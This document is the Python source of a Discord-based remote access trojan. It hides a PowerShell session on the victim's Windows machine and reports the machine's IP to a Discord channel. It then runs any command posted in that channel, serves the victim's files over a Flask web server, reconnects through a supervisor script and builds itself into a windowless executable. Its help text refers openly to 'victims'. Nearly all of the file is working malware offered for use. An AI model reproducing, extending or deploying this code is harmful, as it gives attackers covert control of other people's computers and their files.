from discord.ext import commands
from pathlib import Path
from threading import Thread 
import discord
import urllib.request
import requests
import subprocess
import inspect
import shutil
import time
import os
import sys
import stat

hard_stop = False
flask_process = None

DISCORD_TOKEN = "PLACE_DISCORD_BOT_TOKEN_HERE"

local_app_data = os.getenv('LOCALAPPDATA')
TARGET_DIR = os.path.join(local_app_data, 'Discord-RAT-Bot')
EXE_DIR = os.path.join(TARGET_DIR, "DiscordRAT.py")
UPLOAD_FOLDER = os.path.join(TARGET_DIR, "uploads") 
STATE_FILE = os.path.join(TARGET_DIR, "state.txt")
GIT_DIR = os.path.join(os.getenv("LOCALAPPDATA"), "GitPortable")
GIT_EXE = os.path.join(GIT_DIR, "cmd", "git.exe")

if not os.path.exists(TARGET_DIR):
    os.makedirs(TARGET_DIR, exist_ok=True)

repo_url = "https://github.com/The-R34per/Discord-Remote-Access-Trojan"
folder = "DiscordRAT"   

def clone_github_repo(repo_url):
    
    local_app_data = os.getenv('LOCALAPPDATA')
    target_dir = os.path.join(local_app_data, 'Discord-RAT-Bot')

    print(f"Target Directory: {target_dir}")

    if os.path.exists(target_dir):
        print(f"Directory already exists. Cleaning up {target_dir}...")
        try:
            shutil.rmtree(target_dir)
        except Exception as e:
            print(f"Error deleting existing directory: {e}")
            return

    os.makedirs(os.path.dirname(target_dir), exist_ok=True)

    try:
        print(f"Cloning {repo_url}...")
        subprocess.run(['git', 'clone', repo_url, target_dir], check=True)
        print("\nSuccess! Repository cloned to AppData\\Local\\DiscordTEST")
    except subprocess.CalledProcessError as e:
        print(f"\nAn error occurred while cloning: {e}")
    except FileNotFoundError:
        print("\nError: 'git' command not found. Please ensure Git is installed and in your PATH.")


required_files = ["DiscordRAT.py", "state.txt", "DiscordRATSupervisor.py", "uploads", "FlaskServer.py"]

for filename in required_files:
    file_path = os.path.join(TARGET_DIR, filename)
    if not os.path.exists(file_path):
        clone_github_repo(repo_url)

intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

ps = subprocess.Popen(
    ["powershell", "-NoLogo", "-NoExit", "-Command", "-"],
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
    bufsize=1,
    creationflags=subprocess.CREATE_NO_WINDOW
)

def update_state(status):
    state_path = STATE_FILE
    with open(state_path, "w") as f:
        f.write(status)

def find_portable_git():
    if not os.path.exists(GIT_DIR):
        return None

    for name in os.listdir(GIT_DIR):
        full = os.path.join(GIT_DIR, name)
        if os.path.isdir(full) and name.lower().startswith("portablegit"):
            git_path = os.path.join(full, "cmd", "git.exe")
            if os.path.exists(git_path):
                return git_path
    return None
    
def open_terminal_with_command(command):
    subprocess.Popen(["cmd", "/k", command])

def open_terminal_with_command(command: str):
    subprocess.Popen(["cmd", "/k", command])

def check_git_installation():
    system_git = shutil.which("git")
    if system_git:
        return True, "System Git found.", system_git

    portable_dir = Path(os.getenv("LOCALAPPDATA", "")) / "GitPortable" / "cmd" / "git.exe"
    if portable_dir.exists():
        return True, "Portable Git found.", str(portable_dir)

    return False, "No Git installation detected.", None

def clone_repo_silent(repo_url, target_dir, git_binary):
    os.makedirs(target_dir, exist_ok=True)

    subprocess.run(
        [git_binary, "clone", repo_url, target_dir],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL
    )

def build_exe(script_path, onefile=True):
    args = [sys.executable, "-m", "PyInstaller"]

    if onefile:
        args += ["--onefile", "--noconsole"]

    args.append(script_path)
    subprocess.run(args, shell=True)

def move_pyinstaller_output(target_dir):
    dist_dir = os.path.join(os.getcwd(), "dist")
    build_dir = os.path.join(os.getcwd(), "build")
    spec_file = None

    for file in os.listdir(os.getcwd()):
        if file.endswith(".spec"):
            spec_file = os.path.join(os.getcwd(), file)
            break

    if os.path.exists(dist_dir):
        shutil.move(dist_dir, os.path.join(target_dir, "dist"))

    if os.path.exists(build_dir):
        shutil.move(build_dir, os.path.join(target_dir, "build"))

    if spec_file and os.path.exists(spec_file):
        shutil.move(spec_file, os.path.join(target_dir, os.path.basename(spec_file)))    
  

def execute_cmd(cmd):
    marker = "__CMD_DONE__"
    
    wrapped = f"""
    try {{
        {cmd}
    }} catch {{
        Write-Output "$($_.Exception.Message)"
    }}
    """
    
    ps.stdin.write(wrapped + "\n")
    ps.stdin.write(f'Write-Output "{marker}"\n')
    ps.stdin.flush()

    output = []
    for line in ps.stdout:
        if marker in line:
            break
        output.append(line.rstrip())
    return "\n".join(output)

@client.event
async def on_ready():
    global channel, flask_process
    guild = client.guilds[0]
    ip = requests.get("https://api.ipify.org").text.replace(".", "-")
    channel = await guild.create_text_channel("Computer: " + ip)
    
    if not os.path.exists(UPLOAD_FOLDER):
        os.makedirs(UPLOAD_FOLDER, exist_ok=True)
  
    status_file = os.path.join(TARGET_DIR, "state.txt")
    with open (status_file, "w") as f:
        f.write("running")
    
    flask_process = subprocess.Popen(
        ["python", os.path.join(TARGET_DIR, "FlaskServer.py")],
        cwd=TARGET_DIR)
   
    ascii_art = r"""

    ................................................:::-:.................... . --:.....................
    ..........:::::...........::::::::::--======.##########.======---------==.. ===:-:..................
    ====-:-----=============================##########.##=.. ================.. ===-----:::::...........
    ======================================############..#=    ===============.. ==.=====================
    ====================================############....#.    ===============.. ==.=====================
    =================================##############  #.        ==============.. ========================
    ==============================.  ############=   #.         =============#. ========================
    ================================.     ###.#.#.  #.           ============.. ========================
    =================================       .#..#  ..             ===========.. ========================
    =================================         ..                  ==========-##.========================
    =================================@          .                  =========.#  ========================
    ==================================.         .                    =======..   =======================
    ===================================#         .      #.            ======@.   =======================
    ======-============================@         #    #.   ##.         ======.  ========================
    ==..##..#######............=========#         .  .  #####....       -=.==    =.=====================
    ==..######@###########################        . ##### ##....         =  =   ##==#..######........===
    ==..###=@=@###########################       ####.##.   .               .   #@.##################===
    ==..###===#############################     #=#######=  .:                  =. .#############===@===
    ==..###=################################    ######     .                    = =####..#######====*@==
    ==..###.################################    .    = ==  =-                      .############=====@==
    *=..###=#@##############################            =  =                       =-###########========
    @=..###=##.#############################     #.# ..   .=                        ############====@===
    @=..###=###############################*    ### #.                             .############====@===
    @=..###=##.############################.    ### #. .                            #################===
    @=..###=##=############################=   @.# #.  .                             ################===
    @=..###=##################################### ##=                                ##############=#===
    @=..###=###############.=########@######  #.###..                               .###########@====@@@
    @=..###=############..## .## ######      ####                                    ###########%====..:
    ....###=##@@#######.......  #####   #   ##= #= =                                 .##########-.### ..
    ....##############..     . :#=#..       #. =                                       ...--:...........
    .. .############. ..      # .####-       =.-  =                                    ##.....:.........
    ..........###.  ....      .###.### #- ##  =                                      = #####.#=.........
    .............. .#......   . ####### #####.                                         .#....... ... ...
    ............############   #. .#.   .==                                           .. .....##........
    ...#########.##########:  #   ...  .                                               .#.+..-#..#......
    ####################..  .#.     .  .                                              ...:.#............
            
    
                ████████╗██╗  ██╗███████╗      ██████╗  ██████╗ ██╗  ██╗██████╗ ███████╗██████╗ 
                ╚══██╔══╝██║  ██║██╔════╝      ██╔══██╗ ╚════██╗██║  ██║██╔══██╗██╔════╝██╔══██╗
                   ██║   ███████║█████╗ █████╗ ██████╔╝  █████╔╝███████║██████╔╝█████╗  ██████╔╝
                   ██║   ██╔══██║██╔══╝ ╚════╝ ██╔══██╗  ╚═══██╗╚════██║██╔═══╝ ██╔══╝  ██╔═██╗
                   ██║   ██║  ██║███████╗      ██║   ██║██████╔╝     ██║██║     ███████╗██║  ██║
                   ╚═╝   ╚═╝  ╚═╝╚══════╝      ╚═╝   ╚═╝╚═════╝      ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝
                    
                                    Discord Remote Access Tool/Trojan (RAT)
                                            Created by: The-R34per
                                                
                                 GitHub: https://github.com/The-R34per
                   Website: https://the-r34per.github.io/The-R34per-Website/index.html                                               
                                               
    -----------------------------------------------------------------------------------------------------
    Basic Commands:
    
    ls = List current directory
    cd <directory> = Change directory
    echo <message> = Says <message> back to user
        
    -----------------------------------------------------------------------------------------------------
    Custom Commands:
    
    "shutdown" = Terminates this session, and activates supervisor script
    "hard-shutdown" = Terminates all scripts completly
    "create-exe" = Creates an executable file and stores in in a file
    "create-clone" = creates a clone of the repository and stores it locally on the victims' system
    "upload <file>" = This will upload a file to the server that the victim computer hosts, so you can download the file
    
    -----------------------------------------------------------------------------------------------------
    Examples:
    
    "ls"
    This will list your current working directory
    ---
    "pwd"
    This will print your current path (current working directory)
    ---
    "cd Destop"
    This changes your directory to user's desktop
    ---
    "echo "Hello World" > hello.txt" 
    This creates a file called "hello.txt" in the current directory with the text "Hello World"
    ---
    "upload textDoc.txt"
    This uploads the document "textDoc.txt" to the web server with the url "http://<victim's IP>:5000"
    Lets say the victims IP is "1.2.3.4", the url would be "http://1.2.3.4:5000"
"""


    chunks = [ascii_art[i:i+1900] for i in range(0, len(ascii_art), 1900)]
    for part in chunks:
        await channel.send(f"```\n{part}\n```")
    
    
    time.sleep(1)
    await channel.send(f"```The source code has been cloned into the folder {TARGET_DIR}.```")
  
@client.event
async def on_message(message):
    global hard_stop
    
    if not channel or message.channel.id != channel.id:
        return

    if message.author.bot:
        return
    
    if hard_stop:
        if message.content.lower() in ("y", "yes"):
            await message.channel.send("```Discord Remote Access Trojan is terminating...```")
            update_state("hardstop")
            
            for f in os.listdir(UPLOAD_FOLDER):
                try:
                    os.remove(os.path.join(UPLOAD_FOLDER, f))
                    requests.post("http://127.0.0.1:5000/shutdown?state=hardstop")
                except:
                    pass
                if flask_process:
                    flask_process.terminate()
            await client.close()
            return
        elif message.content.lower() in ("n", "no"):
            hard_stop = False
            await message.channel.send("```Hard shutdown cancelled, script will remain running until stopped.```")
            return
    if message.content.lower() == "hard-shutdown":
        hard_stop = True
        await message.channel.send(
            "```You are about to do a hard shutdown, this means that the supervisor script WILL NOT run, "
            "and you will not be able to reconnect to this computer again. You will no longer be able to "
            "access the web server once this script stops."
            "Are you sure you want to do a hard shutdown (Y/N)?```"
        )
        return
    
    if message.content.startswith("upload "):
        raw_path = message.content.split(" ", 1)[1]
        filepath = os.path.abspath(raw_path)

        if not os.path.exists(filepath):
            await message.channel.send("File not found on system.")
            return

        short_name = os.path.basename(filepath)
        
        with open(filepath, "rb") as f:
            files = {"file": (short_name, f)} # Explicitly name the part
            url = "http://127.0.0.1:5000/upload"
            try:
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    await message.channel.send(f"Uploaded `{short_name}` successfully.")
                    return 
                else:
                    await message.channel.send(f"Server rejected upload (Status {response.status_code}): {response.text}")
                    return
            except requests.exceptions.ConnectionError:
                await message.channel.send("Critical Error: Could not connect to the Flask server. Is it running?")
                return

    if message.content.lower() == "shutdown":
        await message.channel.send("Starting the supervisor script for reconnection...")
        subprocess.Popen(["python", "DiscordRATSupervisor.py"])
        time.sleep(1)
        update_state("supervisor")
        await message.channel.send("Supervisor script running, terminating session.")
        await client.close()
        return
    
    if message.content.lower() == "create-exe":
        await message.channel.send("Creating a executable file of the source script...")
        build_exe(EXE_DIR)
        move_pyinstaller_output(TARGET_DIR)
        await message.channel.send(f"Executable successfully created at {TARGET_DIR}\\dist")
        return
    
    if message.content.lower() == "create-clone":
        ok, msg, git_path = check_git_installation()
        await message.channel.send(f"```{msg}```")

        if not ok:
            await message.channel.send("Git is not installed. Opening a terminal with the install command.")
            open_terminal_with_command("winget install --id Git.Git -e --source winget")
            return
        await message.channel.send("Git is installed, proceeding with clone...")
        
        repo_url = "https://github.com/The-R34per/Discord-Remote-Access-Trojan"
        clone_repo_silent(repo_url, TARGET_DIR, git_path)
        
        await message.channel.send(f"Clone created at {TARGET_DIR}.")
        return
    
    result = execute_cmd(message.content) or f"Executed \"{message.content}\" with no output."

    while True:
        await message.channel.send(result[:2000])
        if len(result) < 2000:
            break
        result = result[2000:]


if not os.path.exists(TARGET_DIR):
    os.makedirs(TARGET_DIR, exit_ok=True)

update_state("running")
client.run(DISCORD_TOKEN)

